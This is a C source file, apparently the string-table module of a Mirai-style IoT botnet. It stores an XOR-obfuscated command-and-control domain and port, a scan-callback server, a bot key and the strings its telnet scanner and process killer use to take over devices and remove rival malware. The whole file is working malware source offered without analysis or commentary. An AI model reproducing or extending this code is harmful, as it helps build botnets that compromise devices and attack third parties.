#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/memory.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_keys[] = {0x5a379362, 0x4f08cb76, 0x35c5646f, 0x134af387, 0x5f21e986, 0x5799d57f, 0x1d63515b, 0x23d6d77e, 0x191f576d, 0x2cc513bb, 0x7375f0e9, 0x399d94af, 0x2f1e9237, 0x56468c33, 0x53878531, 0x3dbb1410, 0x39edc189, 0x332cd761, 0x1ef0c0e8, 0x34ce7f8e,};
struct table_value table[TABLE_MAX_KEYS];

void table_init(void) {

    /* cnc connection */
    add_entry(TABLE_CNC_DOMAIN, "\x50\x5b\x42\x59\x56\x55\x59\x5b\x57\x56\x50\x42\x45\x59\x5b\x48\x55\x48\x44\x57\x50\x42\x56\x59\x5b\x57\x55\x50\x57\x42\x56\x44\x55\x56\x57\x59\x5b\x50\x42\x56\x57\x5b\x59\x1f\x42\x50\x45\x48\x43\x1f\x46\x45\x57", 53);
    add_entry(TABLE_CNC_PORT, "\x0\x2\x2\x6", 4);

    /* scan connection */
    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x5b\x42\x59\x56\x55\x59\x5b\x57\x56\x50\x42\x45\x59\x5b\x48\x55\x48\x44\x57\x50\x42\x56\x59\x5b\x57\x55\x50\x57\x42\x56\x44\x55\x56\x57\x59\x5b\x50\x42\x56\x57\x5b\x59\x1f\x42\x50\x45\x48\x43\x1f\x46\x45\x57", 53);
    add_entry(TABLE_SCAN_CB_PORT, "\x5\x9\x0\x1\x0", 5);

    /* misc */
    add_entry(TABLE_EXEC_SUCCESS, "\x56\x5e\x55\x11\x46\x58\x5d\x5d\x11\x42\x50\x47\x54\x11\x44\x42\x11\x50\x5d\x5d", 20);
    add_entry(TABLE_ATK_VSE, "\x65\x62\x5e\x44\x43\x52\x54\x11\x74\x5f\x56\x58\x5f\x54\x11\x60\x44\x54\x43\x48", 20);
    add_entry(TABLE_BOT_KEY, "\x5c\x54\x5e\x46", 4);

    /* killer */
    add_entry(TABLE_KILLER_PROC, "\x1e\x41\x43\x5e\x52\x1e", 6);
    add_entry(TABLE_KILLER_EXE, "\x1e\x54\x49\x54", 4);
    add_entry(TABLE_KILLER_FD, "\x1e\x57\x55", 3);
    add_entry(TABLE_KILLER_CMDLINE, "\x1e\x52\x5c\x55\x5d\x58\x5f\x54", 8);

    /* scanner */
    add_entry(TABLE_SCAN_ENABLE, "\x54\x5f\x50\x53\x5d\x54", 6);
    add_entry(TABLE_SCAN_SYSTEM, "\x49\x43\x49\x4e\x5f\x57", 6);
    add_entry(TABLE_SCAN_SHELL, "\x42\x59\x54\x5d\x5d", 5);
    add_entry(TABLE_SCAN_SH, "\x42\x59", 2);
    add_entry(TABLE_SCAN_QUERY, "\x1e\x53\x58\x5f\x1e\x53\x44\x42\x48\x53\x5e\x49\x11\x7c\x78\x63\x70\x78", 18);
    add_entry(TABLE_SCAN_NCORRECT, "\x5f\x52\x5e\x43\x43\x54\x52\x45", 8);
    add_entry(TABLE_SCAN_RESP, "\x7c\x78\x63\x70\x78\xb\x11\x50\x41\x41\x5d\x54\x45\x11\x5f\x5e\x45\x11\x57\x5e\x44\x5f\x55", 23);
}

void table_unlock_val(uint8_t id) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked) {
        printf("[table/lock]: tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked) {
        printf("[table/lock]: tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked) {
        printf("[table/get]: tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len) {
    char *cpy = mem_malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

/* lets make an epic obfuscator with 20 table keys because we're rich */
static void toggle_obf(uint8_t id) {
    struct table_value *val = &table[id];

    /* little cpu intensive gagagagaa */
    for (int i = 0; i < TABLE_KEY_LEN; i++) {

        uint32_t table_key = table_keys[i];

        uint8_t k1 = table_key & 0xff,
                k2 = (table_key >> 8) & 0xff,
                k3 = (table_key >> 16) & 0xff,
                k4 = (table_key >> 24) & 0xff;

        for (int i = 0; i < val->val_len; i++) {
            val->val[i] ^= k1;
            val->val[i] ^= k2;
            val->val[i] ^= k3;
            val->val[i] ^= k4;
        }
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
